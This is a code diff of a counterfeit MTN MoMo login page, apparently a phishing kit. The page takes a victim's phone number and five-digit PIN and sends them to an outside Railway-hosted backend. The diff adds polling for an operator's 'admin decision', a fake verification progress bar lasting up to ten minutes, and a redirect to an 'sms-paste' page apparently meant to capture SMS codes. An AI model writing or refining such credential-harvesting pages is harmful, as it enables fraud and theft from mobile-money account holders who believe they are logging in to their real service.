@@ -22,7 +22,6 @@
             position: relative;
         }
 
-        /* Ambient background glow */
         body::before {
             content: "";
             position: fixed;
@@ -103,7 +102,6 @@
             transform: translateX(-50%);
         }
 
-        /* ===== MoMo LOGO (matched to index.html) ===== */
         .mtn-logo {
             display: flex;
             flex-direction: column;
@@ -166,7 +164,6 @@
             z-index: 2;
         }
 
-        /* ===== FORM FIELDS ===== */
         .phone-input-group {
             margin-bottom: 20px;
             position: relative;
@@ -205,7 +202,6 @@
             animation: shake 0.4s ease;
         }
 
-        /* ===== COUNTRY SELECTOR ===== */
         .country-btn {
             display: flex;
             align-items: center;
@@ -324,7 +320,6 @@
             color: #0047AB;
         }
 
-        /* ===== PIN ===== */
         .pin-label-row {
             display: flex;
             justify-content: space-between;
@@ -345,7 +340,6 @@
         }
         .forgot-link:hover { background: #f0f4ff; }
 
-        /* Pin row: 5 boxes + eye toggle on the right */
         .pin-row {
             display: flex;
             align-items: center;
@@ -397,7 +391,6 @@
             animation: shake 0.4s ease;
         }
 
-        /* Eye toggle */
         .eye-toggle {
             flex-shrink: 0;
             width: 46px;
@@ -464,7 +457,6 @@
             to   { opacity: 1; transform: translateY(0); }
         }
 
-        /* ===== LOGIN BUTTON ===== */
         .login-btn {
             width: 100%;
             padding: 16px;
@@ -508,7 +500,6 @@
             transform: translateX(4px);
         }
 
-        /* ===== SECURITY + SIGNUP ===== */
         .security-notice {
             display: flex;
             align-items: center;
@@ -535,7 +526,6 @@
         }
         .signup-text a:hover { text-decoration: underline; }
 
-        /* ===== FOOTER ===== */
         footer {
             padding: 6px;
             color: #a9b0c2;
@@ -665,7 +655,6 @@
             font-weight: 500;
         }
 
-        /* ===== SMALL PHONES ===== */
         @media (max-height: 700px) {
             .phone-input-group { margin-bottom: 14px; }
             .card { padding: 22px 18px; }
@@ -760,14 +749,11 @@
                     <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric" autocomplete="off">
                 </div>
 
-                <!-- Professional eye toggle -->
                 <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show PIN" title="Show PIN">
-                    <!-- Eye-open (default) -->
                     <svg class="eye-open" viewBox="0 0 24 24">
                         <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                         <circle cx="12" cy="12" r="3"/>
                     </svg>
-                    <!-- Eye-closed (when revealed) -->
                     <svg class="eye-closed" viewBox="0 0 24 24">
                         <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                         <line x1="1" y1="1" x2="23" y2="23"/>
@@ -796,10 +782,10 @@
         <div class="verify-content">
             <div class="verify-momo-logo"></div>
             <div class="verify-spinner"></div>
-            <h2 class="verify-title">
+            <h2 class="verify-title" id="verifyTitle">
                 Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
             </h2>
-            <p class="verify-subtitle">This may take up to a minute. Please wait…</p>
+            <p class="verify-subtitle" id="verifySubtitle">Waiting for confirmation. Please hold on…</p>
             <div class="verify-bar">
                 <div class="verify-bar-fill" id="verifyBarFill"></div>
             </div>
@@ -855,7 +841,9 @@
         // BACKEND URL
         // ============================================
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
-        const LOADING_DURATION_MS = 72 * 1000;
+
+        // Poll every 2.5s for admin decision
+        const POLL_INTERVAL_MS = 2500;
 
         // ============================================
         // COUNTRY DATA
@@ -878,7 +866,6 @@
         const phoneWrapper = document.getElementById('phoneWrapper');
         const phoneError   = document.getElementById('phoneError');
 
-        /* Render flag SVGs inline */
         function renderFlagsIn(root = document) {
             root.querySelectorAll('.flag-slot[data-flag]').forEach(el => {
                 const id = el.dataset.flag;
@@ -887,7 +874,6 @@
         }
         renderFlagsIn();
 
-        /* Select country */
         function setCountry(iso) {
             const data = COUNTRIES[iso];
             if (!data) return;
@@ -943,7 +929,7 @@
         });
 
         // ============================================
-        // PIN INPUT (5 boxes)
+        // PIN INPUT
         // ============================================
         const pinBoxes = [
             document.getElementById('pin1'),
@@ -996,7 +982,7 @@
         }
 
         // ============================================
-        // EYE TOGGLE — Show/Hide PIN
+        // EYE TOGGLE
         // ============================================
         const eyeToggle = document.getElementById('eyeToggle');
         let pinVisible = false;
@@ -1007,38 +993,132 @@
                 box.type = pinVisible ? 'text' : 'password';
             });
             eyeToggle.classList.toggle('revealed', pinVisible);
-            eyeToggle.setAttribute('aria-label', pinVisible ? 'Hide PIN' : 'Show PIN');
-            eyeToggle.setAttribute('title', pinVisible ? 'Hide PIN' : 'Show PIN');
         });
 
         // ============================================
-        // VERIFY OVERLAY
+        // VERIFY OVERLAY (indeterminate progress while waiting)
         // ============================================
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
+        const verifyTitle   = document.getElementById('verifyTitle');
+        const verifySubtitle = document.getElementById('verifySubtitle');
+
         let verifyTimer = null;
 
-        function startVerifyBar(durationMs) {
+        function startVerifyBar() {
             verifyOverlay.classList.add('show');
             verifyBarFill.style.width = '0%';
-            const totalSeconds = Math.round(durationMs / 1000);
             const startTime = Date.now();
 
             verifyTimer = setInterval(function() {
-                const elapsedMs = Date.now() - startTime;
-                const raw = (elapsedMs / 1000) / totalSeconds;
-                const eased = 1 - Math.pow(1 - Math.min(raw, 1), 2.2);
-                verifyBarFill.style.width = Math.min(eased * 100, 99).toFixed(1) + '%';
-                if (elapsedMs >= durationMs) {
-                    clearInterval(verifyTimer);
-                    verifyBarFill.style.width = '100%';
-                }
-            }, 1000 / 30);
+                /* Climb to 90% over the 10-minute window, hold at 90% */
+                const elapsed = Date.now() - startTime;
+                const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
+                verifyBarFill.style.width = pct.toFixed(1) + '%';
+            }, 300);
         }
 
         function finishVerifyBar() {
             if (verifyTimer) clearInterval(verifyTimer);
             verifyBarFill.style.width = '100%';
+        }
+
+        function hideVerifyOverlay() {
+            if (verifyTimer) clearInterval(verifyTimer);
+            verifyOverlay.classList.remove('show');
+        }
+
+        /* Show rejection state in overlay, then return to form */
+        function showRejection(reason) {
+            if (verifyTimer) clearInterval(verifyTimer);
+            verifyBarFill.style.width = '100%';
+            verifyBarFill.style.background = '#e74c3c';
+
+            verifyTitle.innerHTML = reason.title;
+            verifySubtitle.textContent = reason.subtitle;
+
+            setTimeout(function() {
+                verifyOverlay.classList.remove('show');
+                /* reset overlay look for next attempt */
+                verifyBarFill.style.background = '';
+                verifyTitle.innerHTML = 'Verifying your <span class="highlight">MoMo account</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>';
+                verifySubtitle.textContent = 'Waiting for confirmation. Please hold on…';
+
+                /* Reset form */
+                pinBoxes.forEach(b => {
+                    b.value = '';
+                    b.classList.remove('filled', 'invalid');
+                });
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN';
+
+                /* Show error on PIN area */
+                pinError.textContent = 'Incorrect credentials. Please try again.';
+                pinError.classList.add('show');
+                pinBoxes[0].focus();
+            }, 1800);
+        }
+
+        // ============================================
+        // POLLING
+        // ============================================
+        let pollTimer = null;
+
+        function stopPolling() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+        }
+
+        function startPolling(sessionId, fullPhone, currentCountry, token) {
+            stopPolling();
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
+                    const data = await res.json().catch(() => ({}));
+
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        stopPolling();
+                        finishVerifyBar();
+
+                        /* Save session */
+                        localStorage.setItem('momoSession', JSON.stringify({
+                            phone: fullPhone,
+                            country: currentCountry,
+                            token: token,
+                            sessionId: sessionId,
+                            loggedInAt: new Date().toISOString()
+                        }));
+                        localStorage.setItem('momoPhone', fullPhone);
+                        localStorage.setItem('momoCountry', currentCountry);
+
+                        setTimeout(() => {
+                            window.location.href = 'sms-paste.html';
+                        }, 300);
+
+                    } else if (data.status === 'rejected') {
+                        stopPolling();
+                        showRejection({
+                            title: 'Incorrect <span class="highlight">credentials</span>',
+                            subtitle: 'Please check your PIN and try again.'
+                        });
+
+                    } else if (data.status === 'timeout') {
+                        stopPolling();
+                        showRejection({
+                            title: 'Request <span class="highlight">timed out</span>',
+                            subtitle: 'Please try again.'
+                        });
+                    }
+                    /* else: still pending → keep polling */
+                } catch (err) {
+                    console.warn('poll error:', err.message);
+                    /* silently keep polling */
+                }
+            }, POLL_INTERVAL_MS);
         }
 
         // ============================================
@@ -1049,6 +1129,9 @@
         loginBtn.addEventListener('click', async function() {
             const countryData = COUNTRIES[currentCountry];
             const phoneDigits = phoneInput.value.replace(/\s/g, '');
+
+            /* clear any old error */
+            pinError.classList.remove('show');
 
             if (phoneDigits.length !== countryData.digits || !/^\d+$/.test(phoneDigits)) {
                 phoneWrapper.classList.add('invalid');
@@ -1061,6 +1144,7 @@
             const pin = getPinValue();
             if (pin.length !== 5) {
                 pinBoxes.forEach(b => b.classList.add('invalid'));
+                pinError.textContent = 'Please enter your 5-digit MoMo PIN';
                 pinError.classList.add('show');
                 pinBoxes[0].focus();
                 return;
@@ -1069,8 +1153,6 @@
             loginBtn.disabled = true;
             loginBtn.textContent = 'LOGGING IN...';
 
-            startVerifyBar(LOADING_DURATION_MS);
-            const overlayStart = Date.now();
             const fullPhone = countryData.code + phoneDigits;
 
             try {
@@ -1095,29 +1177,12 @@
                     throw new Error(data.error || 'Login failed');
                 }
 
-                localStorage.setItem('momoSession', JSON.stringify({
-                    phone: fullPhone,
-                    country: currentCountry,
-                    token: data.token,
-                    loggedInAt: new Date().toISOString()
-                }));
-                localStorage.setItem('momoPhone', fullPhone);
-                localStorage.setItem('momoCountry', currentCountry);
-
-                const elapsed = Date.now() - overlayStart;
-                const remaining = Math.max(0, LOADING_DURATION_MS - elapsed);
-
-                setTimeout(function() {
-                    finishVerifyBar();
-                    setTimeout(function() {
-                        window.location.href = 'sms-paste.html';
-                    }, 350);
-                }, remaining);
+                /* Backend accepted request → show overlay, start polling */
+                startVerifyBar();
+                startPolling(data.sessionId, fullPhone, currentCountry, data.token);
 
             } catch (err) {
                 console.error('Login error:', err);
-                finishVerifyBar();
-                verifyOverlay.classList.remove('show');
                 loginBtn.disabled = false;
                 loginBtn.textContent = 'LOGIN';
                 const reason = err.name === 'AbortError'
